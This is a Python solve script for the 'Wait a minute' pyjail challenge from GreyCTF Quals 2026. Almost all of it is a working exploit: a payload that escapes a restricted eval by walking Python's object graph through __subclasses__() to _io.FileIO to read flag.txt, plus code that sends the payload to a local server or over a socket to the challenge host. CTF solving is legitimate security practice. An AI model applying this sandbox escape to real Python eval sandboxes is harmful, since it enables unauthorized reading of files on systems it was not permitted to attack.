#!/usr/bin/env python3
"""
Solve script for GreyCTF Quals 2026 - Wait a minute

The challenge is a restricted `eval`, but it leaves Python's object graph
reachable. We can walk from an empty tuple to `object.__subclasses__()`, then
down into `_io.FileIO` and read `flag.txt` directly without using any
blacklisted words.
"""

from __future__ import annotations

import argparse
import socket
import subprocess
import sys

PAYLOAD = (
    "().__class__.__base__.__subclasses__()[129]"
    ".__subclasses__()[2]"
    ".__subclasses__()[0]('flag.txt').read()"
)


def solve_local(server_py: str) -> str:
    result = subprocess.check_output(
        [sys.executable, server_py, PAYLOAD],
        text=True,
        stderr=subprocess.STDOUT,
    )
    return result


def solve_remote(host: str, port: int) -> str:
    with socket.create_connection((host, port), timeout=10) as sock:
        sock.sendall((PAYLOAD + "\n").encode())
        sock.shutdown(socket.SHUT_WR)

        chunks = []
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)

    return b"".join(chunks).decode("utf-8", "replace")


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit the Wait a minute pyjail")
    parser.add_argument(
        "--mode",
        choices=["local", "remote", "payload"],
        default="payload",
        help="Print the payload, run locally, or attack the remote service",
    )
    parser.add_argument(
        "--server",
        default="server.py",
        help="Path to the local server script when using --mode local",
    )
    parser.add_argument("--host", default="challs.nusgreyhats.org", help="Remote host")
    parser.add_argument("--port", type=int, default=36267, help="Remote port")
    args = parser.parse_args()

    if args.mode == "payload":
        print(PAYLOAD)
        return 0

    if args.mode == "local":
        print(solve_local(args.server).rstrip())
        return 0

    print(solve_remote(args.host, args.port).rstrip())
    return 0


if __name__ == "__main__":
    sys.exit(main())
